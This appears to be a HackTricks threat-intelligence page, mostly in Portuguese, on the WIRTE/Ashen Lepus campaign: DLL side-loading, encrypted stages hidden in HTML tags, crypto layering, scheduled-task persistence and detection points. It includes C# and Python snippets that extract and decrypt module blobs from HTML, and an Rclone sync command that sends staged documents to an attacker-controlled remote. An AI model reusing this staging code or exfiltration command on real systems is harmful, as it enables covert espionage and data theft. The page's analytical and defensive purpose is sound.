# Avançado DLL Side-Loading com HTML-Embedded Payload Staging

{{#include ../../../banners/hacktricks-training.md}}

## Tradecraft Overview

Ashen Lepus (aka WIRTE) weaponized a repeatable pattern that chains DLL sideloading, staged HTML payloads, and modular .NET backdoors to persist inside Middle Eastern diplomatic networks. A técnica pode ser reutilizada por qualquer operador porque depende de:

- **Archive-based social engineering**: PDFs benignos instruem os alvos a obter um arquivo RAR de um site de compartilhamento. O arquivo empacota um visualizador de documentos EXE com aparência legítima, uma DLL maliciosa nomeada como uma biblioteca confiável (por exemplo, `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`) e um PDF de isca `Document.pdf`.
- **DLL search order abuse**: a vítima clica duas vezes no EXE, o Windows resolve a importação da DLL a partir do diretório atual, e o loader malicioso (AshenLoader) executa dentro do processo confiável enquanto o PDF de isca é aberto para evitar suspeitas.
- **Living-off-the-land staging**: every later stage (AshenStager → AshenOrchestrator → modules) permanece fora do disco até ser necessário, entregue como blobs criptografados escondidos dentro de respostas HTML aparentemente inofensivas.

## Multi-Stage Side-Loading Chain

1. **Decoy EXE → AshenLoader**: o EXE faz side-load do AshenLoader, que realiza host recon, encripta-o com AES-CTR e o envia via POST dentro de parâmetros rotativos como `token=`, `id=`, `q=` ou `auth=` para caminhos com aparência de API (por exemplo, `/api/v2/account`).
2. **HTML extraction**: o C2 só revela o próximo estágio quando o IP do cliente geolocaliza para a região alvo e o `User-Agent` corresponde ao implant, frustrando sandboxes. Quando as verificações passam, o corpo HTTP contém um blob `<headerp>...</headerp>` com o payload AshenStager encriptado em Base64/AES-CTR.
3. **Second sideload**: o AshenStager é implantado com outro binário legítimo que importa `wtsapi32.dll`. A cópia maliciosa injetada no binário busca mais HTML, desta vez extraindo `<article>...</article>` para recuperar o AshenOrchestrator.
4. **AshenOrchestrator**: um controlador modular .NET que decodifica uma config JSON em Base64. Os campos `tg` e `au` da config são concatenados/hasheados para formar a chave AES, que descriptografa `xrk`. Os bytes resultantes atuam como chave XOR para cada blob de módulo buscado em seguida.
5. **Module delivery**: cada módulo é descrito por comentários HTML que redirecionam o parser para uma tag arbitrária, quebrando regras estáticas que procuram apenas por `<headerp>` ou `<article>`. Os módulos incluem persistência (`PR*`), desinstaladores (`UN*`), reconhecimento (`SN`), captura de tela (`SCT`) e exploração de arquivos (`FE`).

### HTML Container Parsing Pattern
```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```
Mesmo que os defensores bloqueiem ou removam um elemento específico, o operador só precisa alterar a tag indicada no comentário HTML para retomar a entrega.

### Quick Extraction Helper (Python)
```python
import base64, re, requests

html = requests.get(url, headers={"User-Agent": ua}).text
tag = re.search(r"<!--\s*TAG:\s*<(.*?)>\s*-->", html, re.I).group(1)
b64 = re.search(fr"<{tag}>(.*?)</{tag}>", html, re.S | re.I).group(1)
blob = base64.b64decode(b64)
# decrypt blob with AES-CTR, then XOR if required
```
## Paralelos de Evasão de HTML Staging

Pesquisas recentes sobre HTML smuggling (Talos) destacam payloads ocultos como strings Base64 dentro de blocos `<script>` em anexos HTML e decodificados via JavaScript em tempo de execução. O mesmo truque pode ser reutilizado para respostas C2: staged blobs criptografados podem ser colocados dentro de uma tag script (ou outro elemento DOM) e decodificados em memória antes do AES/XOR, fazendo a página parecer HTML comum. Talos também mostra obfuscação em camadas (renomeação de identificadores mais Base64/Caesar/AES) dentro de tags script, o que se mapeia de forma limpa para blobs C2 staged por HTML.

## Notas de Variantes Recentes (2024-2025)

- Check Point observou campanhas WIRTE em 2024 que ainda dependiam de sideloading baseado em archive mas usavam `propsys.dll` (stagerx64) como a primeira etapa. O stager decodifica o próximo payload com Base64 + XOR (key `53`), envia requisições HTTP com um `User-Agent` hardcoded, e extrai blobs criptografados embutidos entre tags HTML. Em uma ramificação, a stage foi reconstruída a partir de uma longa lista de strings de IP embutidas decodificadas via `RtlIpv4StringToAddressA`, depois concatenadas nos bytes do payload.
- OWN-CERT documentou ferramentas WIRTE anteriores onde o dropper side-loaded `wtsapi32.dll` protegia strings com Base64 + TEA e usava o próprio nome do DLL como chave de decriptação, então ofuscava dados de identificação do host com XOR/Base64 antes de enviá-los ao C2.

## Endurecimento de Crypto & C2

- **AES-CTR everywhere**: os loaders atuais embutem chaves de 256-bit mais nonces (e.g., `{9a 20 51 98 ...}`) e opcionalmente adicionam uma camada XOR usando strings como `msasn1.dll` antes/depois da decriptação.
- **Key material variations**: loaders anteriores usavam Base64 + TEA para proteger strings embutidas, com a chave de decriptação derivada do nome do DLL malicioso (e.g., `wtsapi32.dll`).
- **Infrastructure split + subdomain camouflage**: os servidores de staging são separados por ferramenta, hospedados em ASNs variados, e às vezes fronted por subdomínios com aparência legítima, então comprometer uma stage não expõe o resto.
- **Recon smuggling**: os dados enumerados agora incluem listagens de Program Files para identificar apps de alto valor e são sempre criptografados antes de saírem do host.
- **URI churn**: parâmetros de query e paths REST rotacionam entre campanhas (`/api/v1/account?token=` → `/api/v2/account?auth=`), invalidando detecções frágeis.
- **User-Agent pinning + safe redirects**: a infraestrutura C2 responde apenas a strings UA exatas e, caso contrário, redireciona para sites benignos de notícias/saúde para se misturar.
- **Gated delivery**: servidores são geo-fenced e só respondem a implants reais. Clientes não aprovados recebem HTML não suspeito.

## Persistência & Loop de Execução

AshenStager cria scheduled tasks que se passam por jobs de manutenção do Windows e executam via `svchost.exe`, e.g.:

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

Essas tarefas relançam a cadeia de sideloading na boot ou em intervalos, garantindo que AshenOrchestrator possa requisitar módulos frescos sem tocar no disco novamente.

## Uso de Clientes de Sync Benignos para Exfiltração

Operadores staged documentos diplomáticos dentro de `C:\Users\Public` (legível por todos e não-suspeito) através de um módulo dedicado, então baixam o binário legítimo do [Rclone](https://rclone.org/) para sincronizar esse diretório com o armazenamento controlado pelo atacante. Unit42 nota que essa é a primeira vez que esse ator foi observado usando Rclone para exfiltração, alinhando-se com a tendência mais ampla de abusar de ferramentas legítimas de sync para se misturar ao tráfego normal:

1. **Stage**: copiar/coletar arquivos-alvo em `C:\Users\Public\{campaign}\`.
2. **Configure**: enviar uma config do Rclone apontando para um endpoint HTTPS controlado pelo atacante (e.g., `api.technology-system[.]com`).
3. **Sync**: executar `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet` para que o tráfego se assemelhe a backups de nuvem normais.

Como o Rclone é amplamente usado para fluxos legítimos de backup, os defensores devem focar em execuções anômalas (binários novos, remotes estranhos ou sincronizações súbitas de `C:\Users\Public`).

## Pontos de Detecção

- Alertar sobre **processos assinados** que inesperadamente carregam DLLs de caminhos graváveis por usuário (filtros do Procmon + `Get-ProcessMitigation -Module`), especialmente quando os nomes dos DLLs coincidem com `netutils`, `srvcli`, `dwampi`, ou `wtsapi32`.
- Inspecionar respostas HTTPS suspeitas em busca de **grandes blobs Base64 embutidos dentro de tags incomuns** ou protegidos por comentários `<!-- TAG: <xyz> -->`.
- Estender a caça em HTML para **strings Base64 dentro de blocos `<script>`** (estágio ao estilo HTML smuggling) que são decodificadas via JavaScript antes do processamento AES/XOR.
- Caçar por **scheduled tasks** que executam `svchost.exe` com argumentos não relacionados a serviços ou que apontam de volta para diretórios do dropper.
- Rastrear **C2 redirects** que só retornam payloads para strings `User-Agent` exatas e, caso contrário, redirecionam para domínios legítimos de notícias/saúde.
- Monitorar por binários **Rclone** aparecendo fora de locais gerenciados pelo TI, novos arquivos `rclone.conf`, ou jobs de sync puxando de diretórios de staging como `C:\Users\Public`.

## References

- [Hamas-Affiliated Ashen Lepus Targets Middle Eastern Diplomatic Entities With New AshTag Malware Suite](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- [Hidden between the tags: Insights into evasion techniques in HTML smuggling](https://blog.talosintelligence.com/hidden-between-the-tags-insights-into-evasion-techniques-in-html-smuggling/)
- [Hamas-affiliated Threat Actor WIRTE Continues its Middle East Operations and Moves to Disruptive Activity](https://research.checkpoint.com/2024/hamas-affiliated-threat-actor-expands-to-disruptive-activity/)
- [WIRTE: In Search of Lost Time](https://www.own.security/en/ressources/blog/wirte-analyse-campagne-cyber-own-cert)

{{#include ../../../banners/hacktricks-training.md}}
